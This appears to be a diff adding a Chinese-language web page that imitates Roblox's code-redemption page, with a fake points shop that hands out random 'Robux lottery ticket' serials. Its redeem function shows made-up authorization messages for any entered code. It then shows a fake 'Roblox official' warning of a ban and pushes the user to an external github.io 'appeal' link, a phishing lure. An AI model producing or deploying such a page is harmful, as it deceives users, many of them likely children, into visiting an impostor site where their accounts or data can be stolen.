@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>兌換 Roblox 序號 - Roblox</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Font Awesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;800&family=Noto+Sans+TC:wght@400;500;700;900&display=swap" rel="stylesheet">
+
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        roblox: {
+                            lightBg: '#ffffff',
+                            cardBg: '#ffffff',
+                            inputBg: '#f2f4f7',
+                            border: '#e5e7eb',
+                            textMain: '#111827',
+                            textSub: '#4b5563',
+                            blueBtn: '#0074e8',
+                            blueHover: '#0062cc'
+                        }
+                    },
+                    fontFamily: {
+                        sans: ['Noto Sans TC', 'Outfit', 'sans-serif'],
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        body {
+            background-color: #ffffff;
+            color: #111827;
+        }
+
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #ffffff;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #d1d5db;
+            border-radius: 3px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #9ca3af;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col selection:bg-blue-600 selection:text-white">
+
+    <!-- Top Header Navigation -->
+    <header class="h-14 bg-white border-b border-gray-200 px-6 flex items-center justify-between sticky top-0 z-40 select-none shadow-sm">
+        <div class="flex items-center gap-8">
+            <div class="flex items-center gap-2 font-black tracking-widest text-2xl text-black font-sans cursor-pointer">
+                <i class="fa-solid fa-cube text-xl"></i>
+                <span>ROBLOX</span>
+            </div>
+            <nav class="hidden md:flex items-center gap-6 text-sm text-gray-700 font-semibold">
+                <a href="#" class="hover:text-black transition">圖表</a>
+                <a href="#" class="hover:text-black transition">市集</a>
+                <a href="#" class="hover:text-black transition">創作</a>
+                <a href="#" class="hover:text-black transition">Robux</a>
+            </nav>
+        </div>
+
+        <!-- Search Bar & User Quick Info -->
+        <div class="flex items-center gap-4">
+            <div class="hidden sm:flex items-center bg-[#f2f4f7] border border-gray-200 rounded-full px-4 py-2 w-48 lg:w-72 focus-within:border-gray-400">
+                <i class="fa-solid fa-magnifying-glass text-gray-400 text-xs mr-2"></i>
+                <input type="text" placeholder="搜尋" class="bg-transparent text-xs text-black focus:outline-none w-full placeholder-gray-500">
+            </div>
+
+            <div class="flex items-center gap-3">
+                <div class="flex items-center gap-1.5 bg-gray-100 px-3 py-1 rounded-full border border-gray-200 text-xs font-bold">
+                    <i class="fa-solid fa-coins text-amber-500"></i>
+                    <span id="user-points-display" class="font-mono text-amber-600">100</span>
+                </div>
+                <button onclick="toggleModal('tickets-modal')" class="relative p-2 bg-gray-100 hover:bg-gray-200 rounded-full border border-gray-200 text-gray-700 transition">
+                    <i class="fa-solid fa-ticket text-emerald-600 text-sm"></i>
+                    <span id="ticket-count-badge" class="absolute -top-1 -right-1 bg-emerald-500 text-white text-[10px] font-bold w-4 h-4 rounded-full flex items-center justify-center font-mono">0</span>
+                </button>
+                <button onclick="toggleModal('shop-modal')" class="p-2 bg-gray-100 hover:bg-gray-200 rounded-full border border-gray-200 text-gray-700 transition" title="FunTech 賺點小遊戲">
+                    <i class="fa-solid fa-gamepad text-cyan-600 text-sm"></i>
+                </button>
+                <button class="bg-[#0074e8] hover:bg-[#0062cc] text-white font-bold px-4 py-1.5 rounded-lg text-xs transition shadow-sm">
+                    註冊
+                </button>
+                <button class="bg-gray-100 hover:bg-gray-200 text-black font-bold px-4 py-1.5 rounded-lg text-xs transition border border-gray-300">
+                    登入
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content Area -->
+    <main class="flex-grow p-6 lg:p-12 max-w-6xl mx-auto grid grid-cols-1 lg:grid-cols-12 gap-12 w-full">
+        <!-- Left Redeem Card Section -->
+        <div class="lg:col-span-7 space-y-6">
+            <div class="space-y-2">
+                <h1 class="text-2xl sm:text-3xl font-extrabold tracking-tight text-black">兌換 Roblox 序號</h1>
+                <p class="text-sm text-gray-600">在下方輸入點數卡、虛擬道具或促銷序號。</p>
+            </div>
+
+            <div class="space-y-4">
+                <div class="space-y-2">
+                    <label class="block text-xs font-bold text-gray-700 uppercase tracking-wider">序號</label>
+                    <div class="relative">
+                        <input id="redeem-code-input" type="text" placeholder="輸入序號..." class="w-full bg-[#f2f4f7] border border-gray-200 focus:border-blue-500 focus:outline-none rounded-xl px-4 py-3 text-sm text-black placeholder-gray-400 transition font-mono pr-12">
+                        <button onclick="pasteFromClipboard()" class="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-black transition" title="貼上">
+                            <i class="fa-regular fa-clipboard text-base"></i>
+                        </button>
+                    </div>
+                </div>
+
+                <button onclick="handleRedeemAction()" class="w-full bg-[#d1d5db] hover:bg-[#9ca3af] text-gray-600 font-bold py-3.5 rounded-xl transition shadow-sm text-sm cursor-pointer">
+                    兌換
+                </button>
+            </div>
+
+            <!-- Status Message Box -->
+            <div id="redeem-status-box"></div>
+
+            <div class="text-xs text-gray-500 leading-relaxed pt-2">
+                兌換代碼即表示你及你的父母或法定監護人（如果你未滿 18 歲）同意我們的使用條款，包括仲裁條款和禮品卡條款和條件，並認可我們的隱私政策。
+            </div>
+        </div>
+
+        <!-- Right Info & Banner Section -->
+        <div class="lg:col-span-5 space-y-6">
+            <div class="space-y-3">
+                <h3 class="font-bold text-black text-sm">額外資訊</h3>
+                <ul class="space-y-3 text-xs text-[#0074e8] font-medium">
+                    <li><a href="#" onclick="showToast('正在開啟教學影片...', 'info')" class="hover:underline flex items-center gap-1.5"><i class="fa-solid fa-circle-play text-gray-400"></i> 如何兌換點數卡 (影片)</a></li>
+                    <li><a href="#" class="hover:underline block text-gray-700">點數卡額外協助</a></li>
+                    <li><a href="#" class="hover:underline block text-gray-700">如何兌換虛擬道具碼</a></li>
+                    <li><a href="#" class="hover:underline block text-gray-700">如何兌換促銷碼</a></li>
+                    <li><a href="#" class="hover:underline block text-gray-700">瞭解 Roblox 的安全、內容管理和家長監護功能</a></li>
+                </ul>
+            </div>
+
+            <!-- Visual Banner Box -->
+            <div class="bg-gray-100 rounded-2xl p-4 border border-gray-200 space-y-4 shadow-md relative overflow-hidden">
+                <div class="grid grid-cols-3 gap-2 opacity-90">
+                    <div class="h-24 bg-gray-200 rounded-lg bg-cover bg-center" style="background-image: url('https://placehold.co/150x100/e2e8f0/64748b?text=Game1')"></div>
+                    <div class="h-24 bg-gray-200 rounded-lg bg-cover bg-center" style="background-image: url('https://placehold.co/150x100/e2e8f0/64748b?text=Game2')"></div>
+                    <div class="h-24 bg-gray-200 rounded-lg bg-cover bg-center" style="background-image: url('https://placehold.co/150x100/e2e8f0/64748b?text=Game3')"></div>
+                </div>
+                <div class="absolute inset-0 bg-gradient-to-t from-black/80 via-transparent to-transparent flex items-end p-4">
+                    <span class="font-black tracking-widest text-lg text-white font-sans">ROBLOX</span>
+                </div>
+            </div>
+
+            <!-- Quick Access to Ticket Shop -->
+            <div class="bg-blue-50/60 border border-blue-100 rounded-2xl p-4 space-y-3">
+                <div class="flex items-center justify-between">
+                    <span class="text-xs font-bold text-gray-800 flex items-center gap-1.5">
+                        <i class="fa-solid fa-ticket text-emerald-600"></i> FunTech 抽獎券專區
+                    </span>
+                    <button onclick="toggleModal('tickets-modal')" class="text-xs text-blue-600 hover:underline">查看我的序號</button>
+                </div>
+                <p class="text-[11px] text-gray-600">使用 Fun 幣兌換各面額 Roblox 抽獎券（500R ~ 10000R）。</p>
+                <button onclick="toggleModal('shop-modal')" class="w-full bg-[#0074e8] hover:bg-[#0062cc] text-white font-bold py-2 rounded-xl text-xs transition shadow-sm">
+                    前往兌換抽獎券 (500R - 10000R)
+                </button>
+            </div>
+        </div>
+    </main>
+
+    <!-- Modal: Roblox Ticket Shop (500R - 10000R) -->
+    <div id="shop-modal" class="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4 hidden">
+        <div class="bg-white border border-gray-200 rounded-2xl max-w-2xl w-full p-6 space-y-4 max-h-[85vh] overflow-y-auto relative shadow-2xl">
+            <button onclick="toggleModal('shop-modal')" class="absolute top-4 right-4 text-gray-400 hover:text-black transition">
+                <i class="fa-solid fa-xmark text-xl"></i>
+            </button>
+            <h3 class="text-lg font-bold text-black flex items-center gap-2">
+                <i class="fa-solid fa-ticket text-emerald-600"></i> Roblox 點數抽獎券兌換專區 (500R - 10000R)
+            </h3>
+            <p class="text-xs text-gray-600">使用 Fun 幣免費兌換各級 Roblox 點數抽獎券：</p>
+
+            <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 pt-2">
+                <!-- 500R -->
+                <div class="bg-gray-50 border border-gray-200 p-4 rounded-xl flex flex-col justify-between space-y-3 shadow-sm">
+                    <div>
+                        <div class="flex justify-between items-center mb-1">
+                            <span class="font-bold text-black text-sm">Roblox 500 Robux 抽獎券</span>
+                            <span class="text-xs font-mono text-purple-600 bg-purple-50 px-2 py-0.5 rounded border border-purple-200">500 R$</span>
+                        </div>
+                        <p class="text-xs text-gray-500">獲得 1 次 500 Robux 禮品卡抽獎資格。</p>
+                    </div>
+                    <div class="flex items-center justify-between pt-2 border-t border-gray-200">
+                        <span class="text-amber-600 text-xs font-bold font-mono"><i class="fa-solid fa-coins mr-1"></i>300 點</span>
+                        <button onclick="redeemTicketItem('Roblox 500 Robux 抽獎券', 300, '500R')" class="bg-[#0074e8] hover:bg-[#0062cc] text-white font-bold text-xs px-3 py-1.5 rounded-lg transition shadow-sm">兌換</button>
+                    </div>
+                </div>
+
+                <!-- 1000R -->
+                <div class="bg-gray-50 border border-gray-200 p-4 rounded-xl flex flex-col justify-between space-y-3 shadow-sm">
+                    <div>
+                        <div class="flex justify-between items-center mb-1">
+                            <span class="font-bold text-black text-sm">Roblox 1000 Robux 抽獎券</span>
+                            <span class="text-xs font-mono text-indigo-600 bg-indigo-50 px-2 py-0.5 rounded border border-indigo-200">1000 R$</span>
+                        </div>
+                        <p class="text-xs text-gray-500">獲得 1 次 1000 Robux 禮品卡抽獎資格。</p>
+                    </div>
+                    <div class="flex items-center justify-between pt-2 border-t border-gray-200">
+                        <span class="text-amber-600 text-xs font-bold font-mono"><i class="fa-solid fa-coins mr-1"></i>550 點</span>
+                        <button onclick="redeemTicketItem('Roblox 1000 Robux 抽獎券', 550, '1000R')" class="bg-[#0074e8] hover:bg-[#0062cc] text-white font-bold text-xs px-3 py-1.5 rounded-lg transition shadow-sm">兌換</button>
+                    </div>
+                </div>
+
+                <!-- 1500R -->
+                <div class="bg-gray-50 border border-gray-200 p-4 rounded-xl flex flex-col justify-between space-y-3 shadow-sm">
+                    <div>
+                        <div class="flex justify-between items-center mb-1">
+                            <span class="font-bold text-black text-sm">Roblox 1500 Robux 抽獎券</span>
+                            <span class="text-xs font-mono text-cyan-600 bg-cyan-50 px-2 py-0.5 rounded border border-cyan-200">1500 R$</span>
+                        </div>
+                        <p class="text-xs text-gray-500">獲得 1 次 1500 Robux 禮品卡抽獎資格。</p>
+                    </div>
+                    <div class="flex items-center justify-between pt-2 border-t border-gray-200">
+                        <span class="text-amber-600 text-xs font-bold font-mono"><i class="fa-solid fa-coins mr-1"></i>800 點</span>
+                        <button onclick="redeemTicketItem('Roblox 1500 Robux 抽獎券', 800, '1500R')" class="bg-[#0074e8] hover:bg-[#0062cc] text-white font-bold text-xs px-3 py-1.5 rounded-lg transition shadow-sm">兌換</button>
+                    </div>
+                </div>
+
+                <!-- 2000R -->
+                <div class="bg-gray-50 border border-gray-200 p-4 rounded-xl flex flex-col justify-between space-y-3 shadow-sm">
+                    <div>
+                        <div class="flex justify-between items-center mb-1">
+                            <span class="font-bold text-black text-sm">Roblox 2000 Robux 抽獎券</span>
+                            <span class="text-xs font-mono text-emerald-600 bg-emerald-50 px-2 py-0.5 rounded border border-emerald-200">2000 R$</span>
+                        </div>
+                        <p class="text-xs text-gray-500">獲得 1 次 2000 Robux 禮品卡抽獎資格。</p>
+                    </div>
+                    <div class="flex items-center justify-between pt-2 border-t border-gray-200">
+                        <span class="text-amber-600 text-xs font-bold font-mono"><i class="fa-solid fa-coins mr-1"></i>1000 點</span>
+                        <button onclick="redeemTicketItem('Roblox 2000 Robux 抽獎券', 1000, '2000R')" class="bg-[#0074e8] hover:bg-[#0062cc] text-white font-bold text-xs px-3 py-1.5 rounded-lg transition shadow-sm">兌換</button>
+                    </div>
+                </div>
+
+                <!-- 5000R -->
+                <div class="bg-gray-50 border border-gray-200 p-4 rounded-xl flex flex-col justify-between space-y-3 shadow-sm">
+                    <div>
+                        <div class="flex justify-between items-center mb-1">
+                            <span class="font-bold text-black text-sm">Roblox 5000 Robux 豪華抽獎券</span>
+                            <span class="text-xs font-mono text-amber-600 bg-amber-50 px-2 py-0.5 rounded border border-amber-200">5000 R$</span>
+                        </div>
+                        <p class="text-xs text-gray-500">獲得 1 次 5000 Robux 豪華禮品卡抽獎資格。</p>
+                    </div>
+                    <div class="flex items-center justify-between pt-2 border-t border-gray-200">
+                        <span class="text-amber-600 text-xs font-bold font-mono"><i class="fa-solid fa-coins mr-1"></i>2200 點</span>
+                        <button onclick="redeemTicketItem('Roblox 5000 Robux 豪華抽獎券', 2200, '5000R')" class="bg-gradient-to-r from-amber-500 to-orange-500 text-white font-bold text-xs px-3 py-1.5 rounded-lg transition shadow-sm">兌換</button>
+                    </div>
+                </div>
+
+                <!-- 10000R -->
+                <div class="bg-gray-50 border border-gray-200 p-4 rounded-xl flex flex-col justify-between space-y-3 shadow-sm">
+                    <div>
+                        <div class="flex justify-between items-center mb-1">
+                            <span class="font-bold text-black text-sm">Roblox 10000 Robux 尊榮抽獎券</span>
+                            <span class="text-xs font-mono text-rose-600 bg-rose-50 px-2 py-0.5 rounded border border-rose-200">10000 R$</span>
+                        </div>
+                        <p class="text-xs text-gray-500">終極尊榮禮品卡，10000 Robux 大獎抽獎資格。</p>
+                    </div>
+                    <div class="flex items-center justify-between pt-2 border-t border-gray-200">
+                        <span class="text-amber-600 text-xs font-bold font-mono"><i class="fa-solid fa-coins mr-1"></i>4000 點</span>
+                        <button onclick="redeemTicketItem('Roblox 10000 Robux 尊榮抽獎券', 4000, '10000R')" class="bg-gradient-to-r from-rose-500 to-pink-500 text-white font-bold text-xs px-3 py-1.5 rounded-lg transition shadow-sm">兌換</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal: My Tickets -->
+    <div id="tickets-modal" class="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4 hidden">
+        <div class="bg-white border border-gray-200 rounded-2xl max-w-md w-full p-6 space-y-4 relative shadow-2xl">
+            <button onclick="toggleModal('tickets-modal')" class="absolute top-4 right-4 text-gray-400 hover:text-black transition">
+                <i class="fa-solid fa-xmark text-xl"></i>
+            </button>
+            <h3 class="text-lg font-bold text-black flex items-center gap-2">
+                <i class="fa-solid fa-ticket text-emerald-600"></i> 我兌換的抽獎券序號
+            </h3>
+            <div id="tickets-list" class="max-h-60 overflow-y-auto space-y-2 pr-1">
+                <p class="text-xs text-gray-400 text-center py-6">尚無已兌換的抽獎券。</p>
+            </div>
+            <div class="pt-2 text-right">
+                <button onclick="toggleModal('tickets-modal')" class="bg-gray-200 hover:bg-gray-300 text-black text-xs px-4 py-2 rounded-lg font-medium">關閉</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal: FunTech Mini Games to Earn Points -->
+    <div id="games-modal" class="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4 hidden">
+        <div class="bg-white border border-gray-200 rounded-2xl max-w-lg w-full p-6 space-y-4 relative shadow-2xl">
+            <button onclick="toggleModal('games-modal')" class="absolute top-4 right-4 text-gray-400 hover:text-black transition">
+                <i class="fa-solid fa-xmark text-xl"></i>
+            </button>
+            <h3 class="text-lg font-bold text-black flex items-center gap-2">
+                <i class="fa-solid fa-gamepad text-cyan-600"></i> FunTech 賺取 Fun幣 專區
+            </h3>
+            <p class="text-xs text-gray-600">參與轉盤或問答即可獲取點數，用來兌換 Roblox 抽獎券！</p>
+            
+            <div class="bg-gray-50 p-4 rounded-xl border border-gray-200 text-center space-y-3">
+                <div class="flex justify-between items-center text-xs">
+                    <span class="text-gray-700 font-semibold">每日輪盤幸運抽</span>
+                    <button onclick="spinWheelMini()" id="spin-mini-btn" class="bg-amber-500 hover:bg-amber-400 text-white font-bold px-3 py-1.5 rounded-lg transition shadow-sm">轉動 ( +50 點 )</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Toast Notification Container -->
+    <div id="toast-container" class="fixed bottom-5 right-5 z-50 flex flex-col gap-2 pointer-events-none"></div>
+
+    <script>
+        // App State
+        let state = {
+            points: parseInt(localStorage.getItem('funtech_points')) || 100,
+            tickets: JSON.parse(localStorage.getItem('funtech_tickets')) || []
+        };
+
+        window.onload = function() {
+            updateUI();
+        };
+
+        function updateUI() {
+            document.getElementById('user-points-display').innerText = state.points;
+            document.getElementById('ticket-count-badge').innerText = state.tickets.length;
+            localStorage.setItem('funtech_points', state.points);
+            updateTicketsList();
+        }
+
+        function toggleModal(modalId) {
+            document.getElementById(modalId).classList.toggle('hidden');
+        }
+
+        function showToast(message, type = 'info') {
+            const toast = document.createElement('div');
+            toast.className = `pointer-events-auto flex items-center gap-2 px-4 py-3 rounded-xl shadow-xl text-xs font-bold transition transform translate-y-2 opacity-0 text-white ${
+                type === 'success' ? 'bg-emerald-600' :
+                type === 'error' ? 'bg-rose-600' : 'bg-gray-800'
+            }`;
+            toast.innerHTML = `<i class="fa-solid ${type === 'success' ? 'fa-circle-check' : 'fa-circle-info'}"></i> ${message}`;
+            
+            const container = document.getElementById('toast-container');
+            container.appendChild(toast);
+
+            setTimeout(() => toast.classList.remove('translate-y-2', 'opacity-0'), 10);
+            setTimeout(() => {
+                toast.classList.add('opacity-0');
+                setTimeout(() => toast.remove(), 300);
+            }, 3000);
+        }
+
+        function pasteFromClipboard() {
+            const input = document.getElementById('redeem-code-input');
+            navigator.clipboard.readText().then(text => {
+                input.value = text;
+                showToast('已從剪貼簿貼上', 'success');
+            }).catch(() => {
+                showToast('無法讀取剪貼簿，請手動貼上', 'error');
+            });
+        }
+
+        function handleRedeemAction() {
+            const input = document.getElementById('redeem-code-input');
+            const statusBox = document.getElementById('redeem-status-box');
+            const code = input.value.trim();
+
+            if (!code) {
+                showToast('請輸入序號或帳號！', 'error');
+                input.focus();
+                return;
+            }
+
+            statusBox.innerHTML = `
+                <div class="p-3 bg-gray-100 border border-gray-200 rounded-xl text-xs text-gray-700 flex items-center gap-2">
+                    <i class="fa-solid fa-spinner animate-spin text-blue-600"><span>正在授權您的roblox...</span></i>
+                </div>
+            `;
+
+            setTimeout(() => {
+                statusBox.innerHTML = `
+                    <div class="p-3 bg-emerald-50 border border-emerald-300 rounded-xl text-xs text-emerald-800 flex items-center gap-2">
+                        <i class="fa-solid fa-circle-check text-emerald-600"></i>
+                        <span>授權成功！正在驗證代碼...</span>
+                    </div>
+                `;
+
+                setTimeout(() => {
+                    statusBox.innerHTML = `
+                        <div class="p-3 bg-red-50 border-2 border-red-600 rounded-xl text-xs text-red-900 space-y-2 shadow-lg">
+                            <div class="font-black text-red-600 flex items-center gap-1.5 text-sm">
+                                <i class="fa-solid fa-triangle-exclamation text-base"></i> roblox官方
+                            </div>
+                            <div class="text-gray-800 leading-relaxed font-sans">
+                                此網站已被勒令停止，您目前違反roblox服務條款，帳戶將進行人工審核，可能面臨永久停權之風險，若要申訴請至以下按鈕進行申訴
+                            </div>
+                            <div class="pt-1">
+                                <a href="https://sean1234560816-hue.github.io/robloxkj_ds/" target="_blank" class="w-full bg-[#e2231a] hover:bg-[#c11c14] text-white font-bold py-2 px-3 rounded-lg text-xs transition shadow flex items-center justify-center gap-1.5 uppercase tracking-wide no-underline">
+                                    <i class="fa-solid fa-arrow-up-right-from-square"></i> 立即前往申訴
+                                </a>
+                            </div>
+                        </div>
+                    `;
+                }, 1200);
+            }, 1500);
+        }
+
+        function redeemTicketItem(title, cost, denomination) {
+            if (state.points < cost) {
+                showToast(`Fun幣不足！還需要 ${cost - state.points} 點`, 'error');
+                return;
+            }
+
+            state.points -= cost;
+            const serial = 'ROBLOX-' + Math.random().toString(36).substring(2, 8).toUpperCase() + '-' + denomination;
+            state.tickets.push({
+                title: title,
+                code: serial,
+                date: new Date().toLocaleDateString()
+            });
+            localStorage.setItem('funtech_tickets', JSON.stringify(state.tickets));
+            updateUI();
+            showToast(`成功兌換 ${title} ！`, 'success');
+            toggleModal('shop-modal');
+        }
+
+        function updateTicketsList() {
+            const list = document.getElementById('tickets-list');
+            if (state.tickets.length === 0) {
+                list.innerHTML = '<p class="text-xs text-gray-400 text-center py-6">尚無已兌換的抽獎券。</p>';
+                return;
+            }
+            list.innerHTML = '';
+            state.tickets.slice().reverse().forEach(t => {
+                const item = document.createElement('div');
+                item.className = 'bg-gray-50 p-3 rounded-xl border border-gray-200 space-y-1 text-xs';
+                item.innerHTML = `
+                    <div class="font-bold text-black">${t.title}</div>
+                    <div class="font-mono text-amber-600 flex justify-between items-center">
+                        <span>序號: ${t.code}</span>
+                        <span class="text-[10px] text-gray-400">${t.date}</span>
+                    </div>
+                `;
+                list.appendChild(item);
+            });
+        }
+
+        function spinWheelMini() {
+            state.points += 50;
+            updateUI();
+            showToast('+50 Fun幣已入帳！', 'success');
+        }
+    </script>
+</body>
+</html>
